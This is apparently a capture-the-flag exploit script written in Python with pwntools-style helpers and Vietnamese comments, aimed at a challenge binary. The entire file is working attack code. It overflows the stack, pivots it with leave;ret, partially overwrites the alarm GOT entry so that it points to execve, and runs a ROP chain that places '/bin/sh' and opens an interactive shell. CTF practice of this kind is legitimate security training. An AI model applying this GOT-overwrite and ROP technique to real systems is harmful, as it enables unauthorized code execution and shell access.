#!/usr/bin/python3

from pwnaio import *

exe = 'chall_patched'
elf = context.binary = ELF(exe, checksec = False)
libc = elf.libc


def GDB(): gdb.attach(p, gdbscript='''
b*0x401260
c
''') if not args.REMOTE else None

p = remote('', ) if args.REMOTE else process(argv=[exe], aslr=False)
if args.GDB: GDB(); input()

pop_rdi = 0x0000000000401247
leave_ret = 0x0000000000401260

payload = flat(
	b'A' * 0x20,
	elf.got.alarm + 0x40,
	0x401249
)
input("1")
s(payload)

payload = flat(
	elf.got.alarm + 0x100,		# RBP (stack pointer)
	0x401249,					# ret adrs 2
	p64(u64(b"/bin/sh\x00")),	# junk, tận dụng làm chỗ chứa string 
	0xDEADBEEF,					# junk
	elf.got.alarm + 0x20,		# address cần ghi + 0x20 (cũng là chỗ chứa rsi) `lea    rax, [rbp - 0x20] -> mov    rsi, rax`
	0x401249					# ret adrs 1
)
input("2")
s(payload)

input("3")
s(b'\xc0\x41')

input("4")
payload = flat(							# leave, ret sẽ set rsp (stack base) về `elf.got.alarm - 0x8`, rồi ret ở elf.got.alarm which is execve
	elf.got.alarm - 0x8,			# <<----------------+
	pop_rdi,						# rop chain (ret 2)	|
	0x404050,						# binsh pointer   	|
	leave_ret,						# >>----------------+ 
	elf.got.alarm + 0x120 - 0x40,	# địa chỉ cần write (rsi
	0x401249						# ret 1
)
s(payload)

input("5")
s(b'\x00')

p.interactive()
